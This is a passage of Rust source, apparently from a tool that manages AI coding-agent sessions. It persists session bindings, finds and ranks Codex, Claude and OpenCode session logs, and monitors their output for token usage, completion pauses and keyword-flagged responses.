use crate::atomic_write::write_text_atomic;
use crate::config::{
    agent_driver_from_command_part, shell_wrapper_command_start, ContinuationTriggerRule,
};
use crate::pollution::{is_keyword_polluted_text, pollution_detection_configured};
use crate::tokens::{extract_token_usage, TokenUsage};
use anyhow::{anyhow, Result};
use chrono::{DateTime, Utc};
use regex::Regex;
use serde_json::{json, Value};
use std::collections::{hash_map::DefaultHasher, HashMap, HashSet, VecDeque};
use std::fs::{self, File};
use std::hash::{Hash, Hasher};
use std::io::{BufRead, BufReader, Seek, SeekFrom};
#[cfg(windows)]
use std::os::windows::fs::OpenOptionsExt;
#[cfg(windows)]
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

const OPENCODE_MONITOR_POLL_INTERVAL: Duration = Duration::from_millis(750);

static SESSION_STORE_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
const SUMMARY_TAIL_READ_BYTES: u64 = 256 * 1024;
const DETAIL_SUMMARY_TAIL_READ_BYTES: u64 = 512 * 1024;

fn session_store_lock() -> &'static Mutex<()> {
    SESSION_STORE_LOCK.get_or_init(|| Mutex::new(()))
}

#[derive(Debug, Clone)]
pub struct SessionStore {
    path: PathBuf,
    data: Value,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct SessionBindingKey {
    pub config_path: Option<PathBuf>,
    pub agent_id: String,
    pub driver: String,
    pub workdir: PathBuf,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SessionCandidate {
    pub session_id: String,
    pub path: PathBuf,
    pub workdir: Option<PathBuf>,
    pub modified_at: Option<DateTime<Utc>>,
    pub score: i64,
    pub reason: String,
    pub summary: String,
    pub occupied_by: Option<String>,
}

impl SessionStore {
    pub fn new(path: PathBuf) -> Self {
        let data = load_session_store_data(&path);
        let mut store = Self { path, data };
        store.ensure_shape();
        store
    }

    pub fn get_session_id(&self, workdir: &Path) -> Option<String> {
        self.data
            .get("workdirs")
            .and_then(Value::as_object)
            .and_then(|map| map.get(&normalize_workdir(workdir)))
            .and_then(Value::as_str)
            .map(str::to_string)
    }

    pub fn get_bound_session_id(&self, key: &SessionBindingKey) -> Option<String> {
        self.data
            .get("agents")
            .and_then(Value::as_object)
            .and_then(|map| map.get(&binding_key_text(key)))
            .and_then(Value::as_object)
            .and_then(|item| item.get("session_id"))
            .and_then(Value::as_str)
            .map(str::to_string)
    }

    pub fn get_bound_session_path(&self, key: &SessionBindingKey) -> Option<PathBuf> {
        self.data
            .get("agents")
            .and_then(Value::as_object)
            .and_then(|map| map.get(&binding_key_text(key)))
            .and_then(Value::as_object)
            .and_then(|item| item.get("session_path"))
            .and_then(Value::as_str)
            .filter(|text| !text.trim().is_empty())
            .map(PathBuf::from)
    }

    pub fn bound_session_paths_for_config_path(
        &mut self,
        config_path: &Path,
    ) -> Result<Vec<PathBuf>> {
        let _guard = session_store_lock()
            .lock()
            .map_err(|_| anyhow!("session store lock poisoned"))?;
        self.reload_latest();
        let target = normalize_workdir(config_path);
        let Some(map) = self.data.get("agents").and_then(Value::as_object) else {
            return Ok(Vec::new());
        };
        Ok(map
            .iter()
            .filter(|(key, value)| bound_session_matches_config_path(key, value, &target))
            .filter_map(|(_, value)| {
                value
                    .get("session_path")
                    .and_then(Value::as_str)
                    .filter(|text| !text.trim().is_empty())
                    .map(PathBuf::from)
            })
            .collect())
    }

    pub fn session_id_bound_to_other(&self, key: &SessionBindingKey, session_id: &str) -> bool {
        let current_key = binding_key_text(key);
        let Some(map) = self.data.get("agents").and_then(Value::as_object) else {
            return false;
        };
        map.iter().any(|(item_key, value)| {
            item_key != &current_key
                && value
                    .get("session_id")
                    .and_then(Value::as_str)
                    .is_some_and(|value| value == session_id)
        })
    }

    pub fn set_bound_session_id(
        &mut self,
        key: &SessionBindingKey,
        session_id: &str,
        session_path: Option<&Path>,
    ) -> Result<()> {
        let _guard = session_store_lock()
            .lock()
            .map_err(|_| anyhow!("session store lock poisoned"))?;
        self.reload_latest();
        if !self.data.get("agents").is_some_and(Value::is_object) {
            self.data["agents"] = json!({});
        }
        let mut value = json!({
            "session_id": session_id,
            "agent_id": key.agent_id,
            "driver": key.driver,
            "workdir": normalize_workdir(&key.workdir),
        });
        if let Some(config_path) = &key.config_path {
            value["config_path"] = Value::String(config_path.to_string_lossy().to_string());
        }
        if let Some(session_path) = session_path {
            value["session_path"] = Value::String(session_path.to_string_lossy().to_string());
        }
        self.data["agents"][binding_key_text(key)] = value;
        self.save_unlocked()
    }

    pub fn delete_bound_sessions_for_config_path(&mut self, config_path: &Path) -> Result<usize> {
        let _guard = session_store_lock()
            .lock()
            .map_err(|_| anyhow!("session store lock poisoned"))?;
        self.reload_latest();
        let target = normalize_workdir(config_path);
        let mut keys = Vec::new();
        let mut workdirs = Vec::new();
        if let Some(map) = self.data.get("agents").and_then(Value::as_object) {
            for (key, value) in map {
                if bound_session_matches_config_path(key, value, &target) {
                    keys.push(key.clone());
                    if let Some(workdir) = value.get("workdir").and_then(Value::as_str) {
                        workdirs.push(workdir.to_string());
                    }
                }
            }
        }
        if keys.is_empty() {
            return Ok(0);
        }
        let removed = keys.len();
        if let Some(map) = self.data.get_mut("agents").and_then(Value::as_object_mut) {
            for key in keys {
                map.remove(&key);
            }
        }
        if let Some(map) = self.data.get_mut("workdirs").and_then(Value::as_object_mut) {
            for workdir in workdirs {
                map.remove(&workdir);
            }
        }
        self.save_unlocked()?;
        Ok(removed)
    }

    pub fn delete_bound_session_id(&mut self, key: &SessionBindingKey) -> Result<()> {
        let _guard = session_store_lock()
            .lock()
            .map_err(|_| anyhow!("session store lock poisoned"))?;
        self.reload_latest();
        if let Some(map) = self.data.get_mut("agents").and_then(Value::as_object_mut) {
            map.remove(&binding_key_text(key));
        }
        if let Some(map) = self.data.get_mut("workdirs").and_then(Value::as_object_mut) {
            map.remove(&normalize_workdir(&key.workdir));
        }
        self.save_unlocked()
    }

    pub fn bound_session_owners(&self) -> HashMap<String, String> {
        let mut out = HashMap::new();
        let Some(map) = self.data.get("agents").and_then(Value::as_object) else {
            return out;
        };
        for (key, value) in map {
            if let Some(session_id) = value.get("session_id").and_then(Value::as_str) {
                out.insert(session_id.to_string(), key.clone());
            }
        }
        out
    }

    pub fn set_session_id(&mut self, workdir: &Path, session_id: &str) -> Result<()> {
        let _guard = session_store_lock()
            .lock()
            .map_err(|_| anyhow!("session store lock poisoned"))?;
        self.reload_latest();
        self.data["workdirs"][normalize_workdir(workdir)] = Value::String(session_id.to_string());
        self.save_unlocked()
    }

    pub fn delete_session_id(&mut self, workdir: &Path) -> Result<()> {
        let _guard = session_store_lock()
            .lock()
            .map_err(|_| anyhow!("session store lock poisoned"))?;
        self.reload_latest();
        if let Some(map) = self.data.get_mut("workdirs").and_then(Value::as_object_mut) {
            map.remove(&normalize_workdir(workdir));
        }
        self.save_unlocked()
    }

    fn reload_latest(&mut self) {
        self.data = load_session_store_data(&self.path);
        self.ensure_shape();
    }

    fn ensure_shape(&mut self) {
        if !self.data.is_object() {
            self.data = json!({});
        }
        if !self.data.get("workdirs").is_some_and(Value::is_object) {
            self.data["workdirs"] = json!({});
        }
    }

    fn save_unlocked(&self) -> Result<()> {
        if let Some(parent) = self.path.parent() {
            fs::create_dir_all(parent)?;
        }
        write_text_atomic(
            &self.path,
            &(serde_json::to_string_pretty(&self.data)? + "\n"),
        )?;
        Ok(())
    }
}

fn load_session_store_data(path: &Path) -> Value {
    fs::read_to_string(path)
        .ok()
        .and_then(|text| serde_json::from_str(&text).ok())
        .filter(Value::is_object)
        .unwrap_or_else(|| json!({"workdirs": {}}))
}

pub fn binding_key_text(key: &SessionBindingKey) -> String {
    let config = key
        .config_path
        .as_ref()
        .map(|path| normalize_workdir(path))
        .unwrap_or_else(|| "__no_config__".to_string());
    format!(
        "{}|{}|{}|{}",
        config,
        key.agent_id.trim().to_ascii_lowercase(),
        key.driver.trim().to_ascii_lowercase(),
        normalize_workdir(&key.workdir)
    )
}

fn bound_session_matches_config_path(
    key: &str,
    value: &Value,
    normalized_config_path: &str,
) -> bool {
    value
        .get("config_path")
        .and_then(Value::as_str)
        .is_some_and(|path| normalize_workdir(Path::new(path)) == normalized_config_path)
        || key
            .split('|')
            .next()
            .is_some_and(|prefix| prefix == normalized_config_path)
}

#[derive(Debug, Clone)]
pub struct CodexSessionIndex {
    codex_home: PathBuf,
    additional_homes: Vec<PathBuf>,
}

impl CodexSessionIndex {
    pub fn new(codex_home: PathBuf) -> Self {
        Self {
            codex_home,
            additional_homes: Vec::new(),
        }
    }

    pub fn with_additional_homes(mut self, homes: Vec<PathBuf>) -> Self {
        self.additional_homes = homes;
        self
    }

    pub fn ranked_candidates(
        &self,
        workdir: &Path,
        config_name: &str,
        agent_name: &str,
        store: &SessionStore,
    ) -> Vec<SessionCandidate> {
        let owners = store.bound_session_owners();
        let context = RankingContext::new(workdir, config_name, agent_name);
        let mut candidates = self
            .session_files()
            .into_iter()
            .filter_map(|path| codex_candidate_from_path(path, &context, &owners))
            .collect::<Vec<_>>();
        sort_session_candidates(&mut candidates);
        dedupe_session_candidates(&mut candidates);
        candidates
    }

    pub fn find_latest_session_id_for_workdir(&self, workdir: &Path) -> Option<String> {
        self.find_latest_session_for_workdir(workdir, None)
            .map(|(session_id, _)| session_id)
    }

    pub fn find_latest_session_for_workdir(
        &self,
        workdir: &Path,
        session_id: Option<&str>,
    ) -> Option<(String, PathBuf)> {
        let file = self.find_latest_session_file_for_workdir(workdir, session_id)?;
        let meta = read_session_meta(&file)?;
        let id = meta.get("id").and_then(Value::as_str)?.to_string();
        Some((id, file))
    }

    pub fn find_latest_session_file_for_workdir(
        &self,
        workdir: &Path,
        session_id: Option<&str>,
    ) -> Option<PathBuf> {
        let target = normalize_workdir(workdir);
        let mut candidates = self.session_files();
        candidates.sort_by_cached_key(|path| {
            std::cmp::Reverse(path.metadata().and_then(|meta| meta.modified()).ok())
        });
        for candidate in candidates {
            let Some(meta) = read_session_meta(&candidate) else {
                continue;
            };
            if meta
                .get("cwd")
                .and_then(Value::as_str)
                .map(|cwd| normalize_workdir(Path::new(cwd)))
                .as_deref()
                != Some(target.as_str())
            {
                continue;
            }
            if let Some(session_id) = session_id {
                if meta.get("id").and_then(Value::as_str) != Some(session_id) {
                    continue;
                }
            }
            return Some(candidate);
        }
        None
    }

    fn session_homes(&self) -> Vec<PathBuf> {
        let mut out = Vec::new();
        let mut seen = HashSet::new();
        for home in std::iter::once(&self.codex_home).chain(self.additional_homes.iter()) {
            let key = normalize_workdir(home);
            if seen.insert(key) {
                out.push(home.clone());
            }
        }
        out
    }

    fn session_files(&self) -> Vec<PathBuf> {
        let mut files = Vec::new();
        for home in self.session_homes() {
            files.extend(jsonl_files(&home.join("sessions")));
        }
        files
    }

    pub fn find_new_session_file_for_workdir(
        &self,
        workdir: &Path,
        launch_started_at: DateTime<Utc>,
    ) -> Option<PathBuf> {
        let sessions_root = self.codex_home.join("sessions");
        let target = normalize_workdir(workdir);
        let mut candidates = jsonl_files(&sessions_root);
        candidates.sort_by_cached_key(|path| {
            std::cmp::Reverse(path.metadata().and_then(|meta| meta.modified()).ok())
        });
        for candidate in candidates {
            let Some(meta) = read_session_meta(&candidate) else {
                continue;
            };
            if meta
                .get("cwd")
                .and_then(Value::as_str)
                .map(|cwd| normalize_workdir(Path::new(cwd)))
                .as_deref()
                != Some(target.as_str())
            {
                continue;
            }
            if parse_timestamp(meta.get("timestamp"))
                .is_none_or(|timestamp| timestamp >= launch_started_at)
            {
                return Some(candidate);
            }
        }
        None
    }
}

impl ClaudeSessionIndex {
    pub fn ranked_candidates(
        &self,
        workdir: &Path,
        config_name: &str,
        agent_name: &str,
        store: &SessionStore,
    ) -> Vec<SessionCandidate> {
        let owners = store.bound_session_owners();
        let context = RankingContext::new(workdir, config_name, agent_name);
        let mut candidates = jsonl_files(&self.claude_home.join("projects"))
            .into_iter()
            .filter_map(|path| claude_candidate_from_path(path, &context, &owners))
            .collect::<Vec<_>>();
        sort_session_candidates(&mut candidates);
        candidates
    }
}

#[derive(Debug, Clone)]
pub struct OpenCodeSessionIndex {
    command: Vec<String>,
    data_dir: PathBuf,
    max_count: usize,
}

impl OpenCodeSessionIndex {
    pub fn new(command: Vec<String>) -> Self {
        Self {
            command,
            data_dir: default_opencode_data_dir(),
            max_count: 200,
        }
    }

    pub fn with_data_dir(mut self, data_dir: PathBuf) -> Self {
        self.data_dir = data_dir;
        self
    }

    pub fn ranked_candidates(
        &self,
        workdir: &Path,
        config_name: &str,
        agent_name: &str,
        store: &SessionStore,
    ) -> Vec<SessionCandidate> {
        let owners = store.bound_session_owners();
        let context = RankingContext::new(workdir, config_name, agent_name);
        let legacy_sessions = self.legacy_sessions();
        let legacy_paths = legacy_sessions
            .iter()
            .filter_map(|(path, value)| extract_session_id(value).map(|id| (id, path.clone())))
            .collect::<HashMap<_, _>>();
        let max_count = self.max_count.to_string();
        let mut candidates = self
            .run_json(
                workdir,
                &[
                    "session",
                    "list",
                    "--format",
                    "json",
                    "--max-count",
                    &max_count,
                    "--pure",
                ],
            )
            .as_ref()
            .map(coerce_json_list)
            .unwrap_or_default()
            .into_iter()
            .filter_map(|item| {
                opencode_candidate_from_value(
                    item,
                    legacy_paths.get(&extract_session_id(item)?).cloned(),
                    &context,
                    &owners,
                )
            })
            .collect::<Vec<_>>();
        candidates.extend(legacy_sessions.into_iter().filter_map(|(path, item)| {
            opencode_candidate_from_value(&item, Some(path), &context, &owners)
        }));
        dedupe_session_candidates(&mut candidates);
        sort_session_candidates(&mut candidates);
        candidates
    }

    fn legacy_sessions(&self) -> Vec<(PathBuf, Value)> {
        json_files(&self.data_dir.join("storage").join("session"))
            .into_iter()
            .filter_map(|path| {
                let value = fs::read(&path)
                    .ok()
                    .and_then(|bytes| serde_json::from_slice::<Value>(&bytes).ok())?;
                // Child sessions are OpenCode background-agent runs, not user conversations.
                if value
                    .get("parentID")
                    .or_else(|| value.get("parentId"))
                    .and_then(Value::as_str)
                    .is_some_and(|id| !id.trim().is_empty())
                {
                    return None;
                }
                Some((path, value))
            })
            .collect()
    }

    fn run_json(&self, workdir: &Path, args: &[&str]) -> Option<Value> {
        run_opencode_json(&self.command, workdir, args)
    }
}

#[derive(Debug)]
pub struct CodexSessionMonitor {
    codex_home: PathBuf,
    workdir: PathBuf,
    launch_started_at: DateTime<Utc>,
    pub session_id: Option<String>,
    pub session_path: Option<PathBuf>,
    pub last_task_started_at: Option<Instant>,
    pub last_task_finished_at: Option<Instant>,
    pub last_session_append_at: Option<Instant>,
    waiting_for_turn_after: Option<Instant>,
    assistant_message_count: u64,
    assistant_message_count_at_wait_start: Option<u64>,
    pub pollution_detected: bool,
    pub completion_pause_detected: bool,
    pub continuation_trigger_prompt: Option<String>,
    pub endpoint_failure_detected: bool,
    pub token_usage_total: TokenUsage,
    active_turn_ids: HashSet<String>,
    position: u64,
    polluted_response_keywords: Vec<String>,
    completion_pause_keywords: Vec<String>,
    continuation_trigger_rules: Vec<ContinuationTriggerRule>,
    polluted_response_threshold: f64,
    polluted_context_window: usize,
    polluted_check_max_chars: usize,
}

#[derive(Debug, Clone)]
pub struct ClaudeSessionIndex {
    claude_home: PathBuf,
}

impl ClaudeSessionIndex {
    pub fn new(claude_home: PathBuf) -> Self {
        Self { claude_home }
    }

    pub fn find_latest_session_id_for_workdir(&self, workdir: &Path) -> Option<String> {
        self.find_latest_session_file_for_workdir(workdir, None)
            .and_then(|path| {
                path.file_stem()
                    .map(|stem| stem.to_string_lossy().to_string())
            })
    }

    pub fn find_latest_session_file_for_workdir(
        &self,
        workdir: &Path,
        session_id: Option<&str>,
    ) -> Option<PathBuf> {
        let root = self.claude_home.join("projects");
        let target = normalize_workdir(workdir);
        let mut candidates = jsonl_files(&root);
        candidates.sort_by_cached_key(|path| {
            std::cmp::Reverse(path.metadata().and_then(|meta| meta.modified()).ok())
        });
        for candidate in candidates {
            if session_id
                .is_some_and(|id| candidate.file_stem().and_then(|stem| stem.to_str()) != Some(id))
            {
                continue;
            }
            if claude_session_matches_workdir(&candidate, &target) {
                return Some(candidate);
            }
        }
        None
    }

    pub fn find_new_session_file_for_workdir(
        &self,
        workdir: &Path,
        launch_started_at: DateTime<Utc>,
    ) -> Option<PathBuf> {
        let root = self.claude_home.join("projects");
        let target = normalize_workdir(workdir);
        let mut candidates = jsonl_files(&root);
        candidates.sort_by_cached_key(|path| {
            std::cmp::Reverse(path.metadata().and_then(|meta| meta.modified()).ok())
        });
        for candidate in candidates {
            if !claude_session_matches_workdir(&candidate, &target) {
                continue;
            }
            let Ok(modified) = candidate.metadata().and_then(|meta| meta.modified()) else {
                continue;
            };
            let modified = DateTime::<Utc>::from(modified);
            if modified >= launch_started_at {
                return Some(candidate);
            }
        }
        None
    }
}

#[derive(Debug)]
pub struct ClaudeSessionMonitor {
    index: ClaudeSessionIndex,
    workdir: PathBuf,
    launch_started_at: DateTime<Utc>,
    pub session_id: Option<String>,
    session_path: Option<PathBuf>,
    position: u64,
    assistant_message_count: u64,
    final_assistant_message_count: u64,
    assistant_usage_by_id: HashMap<String, TokenUsage>,
    assistant_message_count_at_wait_start: Option<u64>,
    final_assistant_message_count_at_wait_start: Option<u64>,
    pub last_session_append_at: Option<Instant>,
    pub token_usage_total: TokenUsage,
    pub pollution_detected: bool,
    pub completion_pause_detected: bool,
    pub continuation_trigger_prompt: Option<String>,
    polluted_response_keywords: Vec<String>,
    completion_pause_keywords: Vec<String>,
    continuation_trigger_rules: Vec<ContinuationTriggerRule>,
    polluted_response_threshold: f64,
    polluted_context_window: usize,
    polluted_check_max_chars: usize,
}

impl ClaudeSessionMonitor {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        claude_home: PathBuf,
        workdir: PathBuf,
        launch_started_at: DateTime<Utc>,
        session_id: Option<String>,
        polluted_response_keywords: Vec<String>,
        completion_pause_keywords: Vec<String>,
        polluted_response_threshold: f64,
        polluted_context_window: usize,
        polluted_check_max_chars: usize,
    ) -> Self {
        Self::new_with_continuation_trigger_rules(
            claude_home,
            workdir,
            launch_started_at,
            session_id,
            polluted_response_keywords,
            completion_pause_keywords,
            Vec::new(),
            polluted_response_threshold,
            polluted_context_window,
            polluted_check_max_chars,
        )
    }

    #[allow(clippy::too_many_arguments)]
    pub fn new_with_continuation_trigger_rules(
        claude_home: PathBuf,
        workdir: PathBuf,
        launch_started_at: DateTime<Utc>,
        session_id: Option<String>,
        polluted_response_keywords: Vec<String>,
        completion_pause_keywords: Vec<String>,
        continuation_trigger_rules: Vec<ContinuationTriggerRule>,
        polluted_response_threshold: f64,
        polluted_context_window: usize,
        polluted_check_max_chars: usize,
    ) -> Self {
        Self {
            index: ClaudeSessionIndex::new(claude_home),
            workdir,
            launch_started_at,
            session_id,
            session_path: None,
            position: 0,
            assistant_message_count: 0,
            final_assistant_message_count: 0,
            assistant_usage_by_id: HashMap::new(),
            assistant_message_count_at_wait_start: None,
            final_assistant_message_count_at_wait_start: None,
            last_session_append_at: None,
            token_usage_total: TokenUsage::default(),
            pollution_detected: false,
            completion_pause_detected: false,
            continuation_trigger_prompt: None,
            polluted_response_keywords,
            completion_pause_keywords,
            continuation_trigger_rules,
            polluted_response_threshold,
            polluted_context_window,
            polluted_check_max_chars,
        }
    }

    pub fn poll(&mut self) {
        if self.session_path.as_ref().is_none_or(|path| !path.exists()) {
            let file = if let Some(session_id) = &self.session_id {
                self.index
                    .find_latest_session_file_for_workdir(&self.workdir, Some(session_id))
            } else {
                self.index
                    .find_new_session_file_for_workdir(&self.workdir, self.launch_started_at)
            };
            if let Some(file) = file {
                self.session_id = file
                    .file_stem()
                    .map(|stem| stem.to_string_lossy().to_string());
                self.session_path = Some(file);
                self.position = 0;
            }
        }
        let Some(path) = self.session_path.clone() else {
            return;
        };
        let Ok(file) = File::open(&path) else {
            return;
        };
        let mut reader = BufReader::new(file);
        if reader.seek(SeekFrom::Start(self.position)).is_err() {
            return;
        }
        let mut last_good_position = self.position;
        let mut next_position = self.position;
        let mut line = String::new();
        loop {
            line.clear();
            let Ok(bytes) = reader.read_line(&mut line) else {
                break;
            };
            if bytes == 0 {
                break;
            }
            next_position = next_position.saturating_add(bytes as u64);
            if let Ok(item) = serde_json::from_str::<Value>(&line) {
                self.observe_item(&item);
                self.last_session_append_at = Some(Instant::now());
                last_good_position = next_position;
            } else if line.ends_with('\n') || line.ends_with('\r') {
                last_good_position = next_position;
            } else {
                break;
            }
        }
        self.position = last_good_position;
    }

    pub fn session_path(&self) -> Option<PathBuf> {
        self.session_path.clone()
    }

    pub fn begin_waiting_for_new_turn(&mut self) {
        self.assistant_message_count_at_wait_start = Some(self.assistant_message_count);
        self.final_assistant_message_count_at_wait_start = Some(self.final_assistant_message_count);
        self.last_session_append_at = Some(Instant::now());
    }

    pub fn has_assistant_message_since_wait_start(&self) -> bool {
        self.assistant_message_count_at_wait_start
            .is_some_and(|count| self.assistant_message_count > count)
    }

    pub fn has_completed_assistant_message_since_wait_start(&self) -> bool {
        self.final_assistant_message_count_at_wait_start
            .is_some_and(|count| self.final_assistant_message_count > count)
    }

    pub fn has_inflight_turn(&self) -> bool {
        self.has_assistant_message_since_wait_start()
            && !self.has_completed_assistant_message_since_wait_start()
    }

    fn observe_item(&mut self, item: &Value) {
        if parse_timestamp(item.get("timestamp"))
            .is_some_and(|timestamp| timestamp < self.launch_started_at)
        {
            return;
        }
        if !is_assistant_message(item) {
            return;
        }
        let usage = claude_message_token_usage(item);
        if !usage.is_empty() {
            self.assistant_usage_by_id
                .insert(exported_assistant_message_id(item), usage);
            self.token_usage_total = summed_token_usage(self.assistant_usage_by_id.values());
        }
        self.assistant_message_count = self.assistant_message_count.saturating_add(1);
        if claude_assistant_message_is_final(item) {
            self.final_assistant_message_count =
                self.final_assistant_message_count.saturating_add(1);
        }
        let text = extract_claude_message_text(item);
        let polluted = pollution_detection_configured(&self.polluted_response_keywords)
            && is_keyword_polluted_text(
                &text,
                &self.polluted_response_keywords,
                self.polluted_response_threshold,
                self.polluted_context_window,
                self.polluted_check_max_chars,
            );
        if polluted {
            self.pollution_detected = true;
        } else if let Some(prompt) =
            continuation_trigger_prompt_for_text(&text, &self.continuation_trigger_rules)
        {
            self.continuation_trigger_prompt.get_or_insert(prompt);
        } else if contains_keyword(&text, &self.completion_pause_keywords) {
            self.completion_pause_detected = true;
        }
    }
}

#[derive(Debug)]
pub struct OpenCodeSessionMonitor {
    command: Vec<String>,
    workdir: PathBuf,
    launch_started_at: DateTime<Utc>,
    session_ids_before_launch: Option<HashSet<String>>,
    pub session_id: Option<String>,
    pub pollution_detected: bool,
    pub completion_pause_detected: bool,
    pub continuation_trigger_prompt: Option<String>,
    seen_fingerprint: String,
    assistant_message_ids: HashSet<String>,
    final_assistant_message_ids: HashSet<String>,
    assistant_usage_by_id: HashMap<String, TokenUsage>,
    assistant_message_count_at_wait_start: Option<usize>,
    final_assistant_message_count_at_wait_start: Option<usize>,
    pub last_session_append_at: Option<Instant>,
    pub token_usage_total: TokenUsage,
    last_cli_poll_at: Option<Instant>,
    polluted_response_keywords: Vec<String>,
    completion_pause_keywords: Vec<String>,
    continuation_trigger_rules: Vec<ContinuationTriggerRule>,
    polluted_response_threshold: f64,
    polluted_context_window: usize,
    polluted_check_max_chars: usize,
}

impl OpenCodeSessionMonitor {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        command: Vec<String>,
        workdir: PathBuf,
        launch_started_at: DateTime<Utc>,
        session_id: Option<String>,
        polluted_response_keywords: Vec<String>,
        completion_pause_keywords: Vec<String>,
        polluted_response_threshold: f64,
        polluted_context_window: usize,
        polluted_check_max_chars: usize,
    ) -> Self {
        Self::new_with_continuation_trigger_rules(
            command,
            workdir,
            launch_started_at,
            session_id,
            polluted_response_keywords,
            completion_pause_keywords,
            Vec::new(),
            polluted_response_threshold,
            polluted_context_window,
            polluted_check_max_chars,
        )
    }

    #[allow(clippy::too_many_arguments)]
    pub fn new_with_continuation_trigger_rules(
        command: Vec<String>,
        workdir: PathBuf,
        launch_started_at: DateTime<Utc>,
        session_id: Option<String>,
        polluted_response_keywords: Vec<String>,
        completion_pause_keywords: Vec<String>,
        continuation_trigger_rules: Vec<ContinuationTriggerRule>,
        polluted_response_threshold: f64,
        polluted_context_window: usize,
        polluted_check_max_chars: usize,
    ) -> Self {
        Self {
            command,
            workdir,
            launch_started_at,
            session_ids_before_launch: None,
            session_id,
            pollution_detected: false,
            completion_pause_detected: false,
            continuation_trigger_prompt: None,
            seen_fingerprint: String::new(),
            assistant_message_ids: HashSet::new(),
            final_assistant_message_ids: HashSet::new(),
            assistant_usage_by_id: HashMap::new(),
            assistant_message_count_at_wait_start: None,
            final_assistant_message_count_at_wait_start: None,
            last_session_append_at: None,
            token_usage_total: TokenUsage::default(),
            last_cli_poll_at: None,
            polluted_response_keywords,
            completion_pause_keywords,
            continuation_trigger_rules,
            polluted_response_threshold,
            polluted_context_window,
            polluted_check_max_chars,
        }
    }

    pub fn capture_session_baseline(command: &[String], workdir: &Path) -> Option<HashSet<String>> {
        let output = run_opencode_json(
            command,
            workdir,
            &[
                "session",
                "list",
                "--format",
                "json",
                "--max-count",
                "200",
                "--pure",
            ],
        )?;
        Some(opencode_root_session_ids_for_workdir(&output, workdir))
    }

    pub fn with_session_baseline(mut self, session_ids: Option<HashSet<String>>) -> Self {
        self.session_ids_before_launch = session_ids;
        self
    }

    pub fn poll(&mut self) {
        if !self.reserve_cli_poll_slot(Instant::now()) {
            return;
        }
        if self.session_id.is_none() {
            self.session_id = self.find_latest_session_id();
        }
        let Some(session_id) = self.session_id.clone() else {
            return;
        };
        let output = self.run_json(&["export", &session_id, "--pure"]);
        let Some(output) = output else {
            return;
        };
        self.observe_exported_value(&output);
    }

    fn observe_exported_value(&mut self, value: &Value) {
        let fingerprint = serde_json::to_string(value).unwrap_or_default();
        if fingerprint == self.seen_fingerprint {
            return;
        }
        self.seen_fingerprint = fingerprint;
        self.last_session_append_at = Some(Instant::now());
        for item in walk_dicts(value) {
            self.observe_exported_item(item);
        }
    }

    fn observe_exported_item(&mut self, item: &Value) {
        if !is_assistant_like(item) {
            return;
        }
        if exported_message_timestamp(item)
            .is_some_and(|timestamp| timestamp < self.launch_started_at)
        {
            return;
        }
        let message_id = exported_assistant_message_id(item);
        self.assistant_message_ids.insert(message_id.clone());
        if opencode_assistant_message_is_final(item) {
            self.final_assistant_message_ids.insert(message_id.clone());
        }
        let usage = opencode_message_token_usage(item);
        if !usage.is_empty() {
            self.assistant_usage_by_id.insert(message_id, usage);
            self.token_usage_total = summed_token_usage(self.assistant_usage_by_id.values());
        }
        let text = extract_any_message_text(item);
        if text.trim().is_empty() {
            return;
        }
        let polluted = pollution_detection_configured(&self.polluted_response_keywords)
            && is_keyword_polluted_text(
                &text,
                &self.polluted_response_keywords,
                self.polluted_response_threshold,
                self.polluted_context_window,
                self.polluted_check_max_chars,
            );
        if polluted {
            self.pollution_detected = true;
        } else if let Some(prompt) =
            continuation_trigger_prompt_for_text(&text, &self.continuation_trigger_rules)
        {
            self.continuation_trigger_prompt.get_or_insert(prompt);
        } else if contains_keyword(&text, &self.completion_pause_keywords) {
            self.completion_pause_detected = true;
        }
    }

    pub fn begin_waiting_for_new_turn(&mut self) {
        self.assistant_message_count_at_wait_start = Some(self.assistant_message_ids.len());
        self.final_assistant_message_count_at_wait_start =
            Some(self.final_assistant_message_ids.len());
        self.last_session_append_at = Some(Instant::now());
    }

    pub fn has_assistant_message_since_wait_start(&self) -> bool {
        self.assistant_message_count_at_wait_start
            .is_some_and(|count| self.assistant_message_ids.len() > count)
    }

    pub fn has_completed_assistant_message_since_wait_start(&self) -> bool {
        self.final_assistant_message_count_at_wait_start
            .is_some_and(|count| self.final_assistant_message_ids.len() > count)
    }

    pub fn has_inflight_turn(&self) -> bool {
        self.has_assistant_message_since_wait_start()
            && !self.has_completed_assistant_message_since_wait_start()
    }

    fn find_latest_session_id(&self) -> Option<String> {
        let output = self.run_json(&[
            "session",
            "list",
            "--format",
            "json",
            "--max-count",
            "50",
            "--pure",
        ])?;
        new_opencode_session_id_since(
            &output,
            &self.workdir,
            self.launch_started_at,
            self.session_ids_before_launch.as_ref(),
        )
    }

    fn reserve_cli_poll_slot(&mut self, now: Instant) -> bool {
        if self.last_cli_poll_at.is_some_and(|last| {
            now.saturating_duration_since(last) < OPENCODE_MONITOR_POLL_INTERVAL
        }) {
            return false;
        }
        self.last_cli_poll_at = Some(now);
        true
    }

    fn run_json(&self, args: &[&str]) -> Option<Value> {
        run_opencode_json(&self.command, &self.workdir, args)
    }
}

fn run_opencode_json(command_parts: &[String], workdir: &Path, args: &[&str]) -> Option<Value> {
    let executable = opencode_cli_executable(command_parts)?;
    let mut command = Command::new(executable);
    command.args(args).current_dir(workdir);
    hide_command_window(&mut command);
    let output = command.output().ok()?;
    if !output.status.success() {
        return None;
    }
    serde_json::from_slice(&output.stdout).ok()
}

fn hide_command_window(command: &mut Command) {
    #[cfg(windows)]
    {
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        command.creation_flags(CREATE_NO_WINDOW);
    }
}

fn opencode_cli_executable(command: &[String]) -> Option<&str> {
    if command
        .first()
        .is_some_and(|item| agent_driver_from_command_part(item) == Some("opencode"))
    {
        return command.first().map(String::as_str);
    }
    if let Some(start) = shell_wrapper_command_start(command) {
        if command
            .get(start)
            .is_some_and(|item| agent_driver_from_command_part(item) == Some("opencode"))
        {
            return command.get(start).map(String::as_str);
        }
    }
    command.first().map(String::as_str)
}

impl CodexSessionMonitor {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        codex_home: PathBuf,
        workdir: PathBuf,
